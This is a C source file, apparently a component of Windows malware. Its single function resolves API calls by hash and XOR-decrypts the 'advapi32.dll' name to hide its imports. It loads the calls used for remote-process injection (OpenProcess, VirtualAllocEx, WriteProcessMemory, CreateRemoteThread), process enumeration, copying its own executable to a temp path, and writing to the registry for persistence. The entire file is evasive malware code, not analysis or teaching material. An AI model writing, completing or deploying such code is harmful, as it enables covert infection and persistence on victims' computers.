#include <windows.h>

#include "CalcAPI.h"
#include "LoadAPI.h"
#include "Decryption.h"
#include "LoadAPI.h"

BOOL loadApi(API_Call *APICall) {
	Kernel32_API* Kernel32api = &(APICall->Kernel32api);
	advapi32_API* advapi32api = &(APICall->advapi32api);

	char advapi32DllStr[] = "\x18\x25\x07\x37\x39\x1F\x02\x15\x6A\x08\x01\x3E\x4B";
	char advapi32DllStrKey[] = "\x79\x41\x71\x56\x49\x76\x31\x27\x44\x6C\x6D\x52\x4B";

	const DWORD hash_kernel32_dll = 0x29cdd463;
	const DWORD hash_LoadLibraryA = 0xe96ce9ef;

	LoadLibraryA_F pLoadLibraryA =(LoadLibraryA_F) find_api(hash_kernel32_dll, hash_LoadLibraryA);
	if(pLoadLibraryA == NULL)
		return FALSE;

	decryptionRoutine(advapi32DllStr,(int)strlen(advapi32DllStr), advapi32DllStrKey, (int)strlen(advapi32DllStrKey));


	Kernel32api->CreateRemoteThreadF = (CreateRemoteThread_F)find_api(hash_kernel32_dll, 0x515d2243);
	Kernel32api->OpenProcessF = (OpenProcess_F)find_api(hash_kernel32_dll, 0x74f0acb6);
	Kernel32api->VirtualAllocExF = (VirtualAllocEx_F)find_api(hash_kernel32_dll, 0x5d5ee53c);
	Kernel32api->WriteProcessMemoryF = (WriteProcessMemory_F)find_api(hash_kernel32_dll, 0xa9088eca);
	Kernel32api->CloseHandleF = (CloseHandle_F)find_api(hash_kernel32_dll, 0xfef545);
	Kernel32api->CreateToolhelp32SnapshotF = (CreateToolhelp32Snapshot_F)find_api(hash_kernel32_dll, 0x9eb60b55);
	Kernel32api->Process32FirstF = (Process32First_F)find_api(hash_kernel32_dll, 0x454fc0f);
	Kernel32api->Process32NextF = (Process32Next_F)find_api(hash_kernel32_dll, 0xa1178452);
	Kernel32api->GetTempPathAF = (GetTempPathA_F)find_api(hash_kernel32_dll, 0xb5237431);
	Kernel32api->GetModuleFileNameAF = (GetModuleFileNameA_F)find_api(hash_kernel32_dll, 0x2af75c1d);
	Kernel32api->CopyFileAF = (CopyFileA_F)find_api(hash_kernel32_dll, 0xc7c10569);
	if(Kernel32api->CreateRemoteThreadF == NULL ||Kernel32api->OpenProcessF == NULL ||Kernel32api->VirtualAllocExF == NULL ||Kernel32api->WriteProcessMemoryF == NULL ||Kernel32api->CloseHandleF == NULL ||Kernel32api->CreateToolhelp32SnapshotF == NULL ||Kernel32api->Process32FirstF == NULL ||Kernel32api->Process32NextF == NULL ||Kernel32api->GetTempPathAF == NULL ||Kernel32api->GetModuleFileNameAF == NULL ||Kernel32api->CopyFileAF == NULL)
		return FALSE;

	if(pLoadLibraryA(advapi32DllStr) != NULL) {
		const DWORD advapi32Hash = 0x35c841f5;
		memset(advapi32DllStr,0x00,13);
		advapi32api->RegOpenKeyExAF = (RegOpenKeyExA_F)find_api(advapi32Hash, 0xaf60e09c);
		advapi32api->RegSetValueExAF = (RegSetValueExA_F)find_api(advapi32Hash, 0xa48d94fc);
		advapi32api->RegCloseKeyF = (RegCloseKey_F)find_api(advapi32Hash, 0xd91f178a);
		if(advapi32api->RegOpenKeyExAF == NULL ||advapi32api->RegSetValueExAF == NULL ||advapi32api->RegCloseKeyF == NULL)
			return FALSE;
	}else
		return FALSE;

	return TRUE;
}


FARPROC GetProcAddress(HMODULE hModule, LPCSTR  lpProcName);